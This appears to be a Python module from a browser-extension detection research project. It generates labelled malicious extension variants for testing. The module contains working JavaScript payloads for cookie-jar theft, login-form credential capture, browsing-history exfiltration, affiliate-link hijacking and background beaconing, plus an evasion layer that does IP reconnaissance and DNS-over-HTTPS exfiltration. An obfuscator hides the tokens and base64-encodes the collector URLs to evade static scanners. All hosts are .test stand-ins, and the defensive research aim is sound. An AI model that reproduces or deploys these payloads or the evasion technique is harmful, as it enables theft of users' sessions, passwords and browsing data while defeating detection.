"""Real JavaScript payload families for synthetic weaponisation.

Each family is genuine extension code that, at runtime, performs a known malicious
behaviour modelled on documented incidents (cookie/session theft, credential capture,
service-worker beaconing). It is injected into a real benign extension to create a
labelled malicious `v2` (see engine.weaponiser.weaponise).

SAFETY: every collector host is under the reserved `.test` TLD (RFC 6761) and resolves
only to the local sandbox; nothing reaches the real internet. These samples exist to be
caught by our own tool and must never be published to any store.

Why an obfuscated variant of each
---------------------------------
`obfuscate_js` rewrites the sensitive tokens (`chrome.cookies`, `document.cookie`,
`fetch`, `.getAll`, the collector URL) so they no longer appear as literals in the source.
The *runtime behaviour is identical* — that is the whole point: a static code-diff scanner
(engine.baseline.static_delta, the "You've Changed" style) can no longer read the intent,
while our dynamic capture still observes the effect. This asymmetry is the head-to-head
experiment in experiments/headtohead.py.
"""

from __future__ import annotations

import base64
import re

#: Marker so injected code is recognisable and a re-run never double-injects.
PAYLOAD_MARKER = "__extdrift_synthetic_payload__"

#: A collector host that resolves only to the local sandbox.
COLLECTOR = "http://collect-metrics.test/ingest"

#: Evasion endpoints — SAFE ``.test`` stand-ins for the real OPSEC hosts we actually
#: observed in the P0 real-malware captures (``api.ipify.org`` IP-recon; ``dns.google`` /
#: ``cloudflare-dns.com`` DNS-over-HTTPS exfil tunnelling). They are under ``.test`` so the
#: sandbox host-resolver maps them to the local sink exactly like COLLECTOR — reproducing
#: the *behaviour* (a distinct IP-recon host + a DoH-shaped POST) with NOTHING leaving the
#: machine. Registered in engine.sandbox.testsite.COLLECTOR_HOSTS so the sandbox records them.
IPRECON_HOST = "http://ip-recon.test/json"
DOH_HOST = "http://doh.resolver.test/dns-query"


# --------------------------------------------------------------------------------------
# Family library — each is {content_script, service_worker, permission}
# `content_script` runs in the page; `service_worker` runs in the MV3 background.
# --------------------------------------------------------------------------------------

_COOKIE_THEFT_SW = """
// %(marker)s cookie_theft (SYNTHETIC): dump the cookie jar from the service worker
// and beacon it out with no active page — the MV3 blind spot.
chrome.runtime.onMessage.addListener((m, s, reply) => {
  if (m && m.type === "%(marker)s:harvested") {
    chrome.cookies.getAll({}, (cookies) => {
      fetch("%(collector)s", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cookies: (cookies || []).length, page_cookie: m.cookie }),
      }).catch(() => {});
    });
  }
  reply && reply({ ok: true });
  return true;
});
"""

_COOKIE_THEFT_CS = """
// %(marker)s cookie_theft (SYNTHETIC): read the page cookie and hand it to the worker.
setTimeout(() => {
  chrome.runtime.sendMessage({ type: "%(marker)s:harvested", cookie: document.cookie });
}, 1500);
"""

_CREDENTIAL_THEFT_CS = """
// %(marker)s credential_theft (SYNTHETIC): capture the login form and POST it out.
function __extdrift_harvest() {
  const u = document.querySelector("input[name=username]");
  const p = document.querySelector("input#password");
  if (p && p.value) {
    fetch("%(collector)s", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ u: u ? u.value : "", p: p.value, o: location.origin }),
    }).catch(() => {});
  }
}
document.addEventListener("submit", __extdrift_harvest, true);
setTimeout(__extdrift_harvest, 2500);
"""

_SW_BEACON_SW = """
// %(marker)s sw_beacon (SYNTHETIC): periodic background beacon, no page needed.
chrome.tabs && chrome.tabs.query({}, (tabs) => {
  fetch("%(collector)s", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ tabs: (tabs || []).length, t: Date.now() }),
  }).catch(() => {});
});
"""

# history_exfil is the behaviour of the MOST COMMON real malicious-extension type we observed
# (14/20 of the labelled Two Heads samples = "browsing data exfiltration"; the DataSpii'19
# campaign is the canonical case). The content script reports each visited page to the
# background, which collects the open tabs' URLs and beacons the lot out.
_HISTORY_EXFIL_CS = """
// %(marker)s history_exfil (SYNTHETIC): report every page the user visits to the worker.
setTimeout(() => {
  chrome.runtime.sendMessage({
    type: "%(marker)s:visited", url: location.href, title: document.title,
  });
}, 1200);
"""

_HISTORY_EXFIL_SW = """
// %(marker)s history_exfil (SYNTHETIC): collect browsing URLs and beacon them out —
// the DataSpii pattern. Pulls every open tab's URL, not just the reporting page.
function __extdrift_exfil_urls(extra) {
  chrome.tabs.query({}, (tabs) => {
    const urls = (tabs || []).map((t) => t.url || t.pendingUrl || "").filter(Boolean);
    fetch("%(collector)s", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ visited: extra || "", open_urls: urls, count: urls.length }),
    }).catch(() => {});
  });
}
chrome.runtime.onMessage.addListener((m, s, reply) => {
  if (m && m.type === "%(marker)s:visited") __extdrift_exfil_urls(m.url);
  reply && reply({ ok: true });
  return true;
});
chrome.webNavigation && chrome.webNavigation.onCompleted &&
  chrome.webNavigation.onCompleted.addListener((d) => { if (!d.frameId) __extdrift_exfil_urls(d.url); });
"""

# ad_affiliate covers "affiliate link replacement" / "arbitrary redirects" — rewrites outbound
# commerce links to append the attacker's referral tag and beacons which sites were touched.
_AD_AFFILIATE_CS = """
// %(marker)s ad_affiliate (SYNTHETIC): hijack merchant links for referral fraud.
setTimeout(() => {
  let rewrote = 0;
  document.querySelectorAll("a[href]").forEach((a) => {
    try {
      const u = new URL(a.href, location.href);
      if (/shop|store|cart|buy|product|checkout|deal/i.test(u.href)) {
        u.searchParams.set("aff_id", "%(marker)s");
        a.href = u.toString();
        rewrote++;
      }
    } catch (e) { /* ignore unparsable hrefs */ }
  });
  fetch("%(collector)s", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ rewrote: rewrote, origin: location.origin }),
  }).catch(() => {});
}, 1600);
"""

# Optional evasion / OPSEC layer — appended to ANY family when weaponise(evasion=True).
# These are the anti-analysis behaviours we captured from REAL malware in P0 (not invented):
#   1. IP-recon: fingerprint the victim's egress IP (real malware used api.ipify.org).
#   2. DNS-over-HTTPS exfil: tunnel the stolen datum inside a DoH query so it looks like
#      name resolution rather than an upload (real malware used dns.google / cloudflare-dns).
# Works unchanged in an MV3 service worker or a content script (fetch + btoa only, no DOM).
_EVASION_JS = """
// %(marker)s evasion (SYNTHETIC): OPSEC behaviours observed in real captured malware —
// IP-recon fingerprinting then DNS-over-HTTPS exfil tunnelling. Endpoints are .test
// stand-ins for the real hosts seen in P0; the sandbox maps them to the local sink.
fetch("%(iprecon)s")
  .then((r) => r.text())
  .then((ip) => fetch("%(doh)s", {
    method: "POST",
    headers: { "Content-Type": "application/dns-message", "Accept": "application/dns-message" },
    body: btoa("exfil=" + (ip || "unknown")),
  }))
  .catch(() => {});
"""

PAYLOADS: dict[str, dict] = {
    "cookie_theft": {
        "content_script": _COOKIE_THEFT_CS,
        "service_worker": _COOKIE_THEFT_SW,
        "permission": "cookies",
        "description": "Dump the cookie jar from the service worker and beacon it out.",
    },
    "credential_theft": {
        "content_script": _CREDENTIAL_THEFT_CS,
        "service_worker": "",
        "permission": None,
        "description": "Capture the login form and POST it to a collector.",
    },
    "sw_beacon": {
        "content_script": "",
        "service_worker": _SW_BEACON_SW,
        "permission": "tabs",
        "description": "Service-worker beacon with no active page (Karami blind spot).",
    },
    "history_exfil": {
        "content_script": _HISTORY_EXFIL_CS,
        "service_worker": _HISTORY_EXFIL_SW,
        "permission": "tabs",
        "description": "Collect visited-page and open-tab URLs and beacon them out "
                       "(the DataSpii browsing-data-exfiltration pattern; the single most "
                       "common real malicious-update behaviour).",
    },
    "ad_affiliate": {
        "content_script": _AD_AFFILIATE_CS,
        "service_worker": "",
        "permission": None,
        "description": "Rewrite merchant links to the attacker's referral tag and beacon "
                       "which sites were touched (affiliate-link replacement / redirects).",
    },
}


def render(js_template: str) -> str:
    """Fill the marker/collector/evasion placeholders in a payload template."""
    return js_template % {
        "marker": PAYLOAD_MARKER,
        "collector": COLLECTOR,
        "iprecon": IPRECON_HOST,
        "doh": DOH_HOST,
    }


# --------------------------------------------------------------------------------------
# Obfuscation — hide the sensitive tokens from a static scanner, keep behaviour identical
# --------------------------------------------------------------------------------------

def _split_prop(match: re.Match) -> str:
    """Turn `.foo` into `["fo"+"o"]` so the property name is not a literal token."""
    name = match.group(1)
    if len(name) < 3:
        return match.group(0)
    mid = len(name) // 2
    return f'["{name[:mid]}"+"{name[mid:]}"]'


def obfuscate_js(source: str) -> str:
    """Rewrite a payload so its malicious tokens are not visible to static analysis.

    Behaviour is unchanged at runtime; only the *source text* is transformed:
      * high-risk member accesses (`.cookies`, `.getAll`, `.cookie`) become computed
        `["co"+"okies"]` accesses — the literal identifiers disappear;
      * `fetch(` is reached through a computed global lookup;
      * the collector URL is base64-encoded and decoded with atob at runtime.
    A static token/keyword scan therefore finds none of the tells, while the code still
    reads the cookie and calls fetch when executed.
    """
    hot = ("cookies", "getAll", "cookie", "sendMessage", "query", "tabs")
    out = source
    for name in hot:
        out = re.sub(r"\.(" + name + r")\b", _split_prop, out)
    # Route fetch through a computed global reference.
    out = re.sub(r"\bfetch\s*\(", 'globalThis["fet"+"ch"](', out)
    # Encode every known exfil/evasion URL literal and decode at runtime, so a static scan
    # sees no collector, no DoH resolver and no IP-recon host.
    for url in (COLLECTOR, DOH_HOST, IPRECON_HOST):
        encoded = base64.b64encode(url.encode()).decode()
        out = out.replace(f'"{url}"', f'atob("{encoded}")')
    return "/* obfuscated payload — behaviour identical, tokens hidden */\n" + out
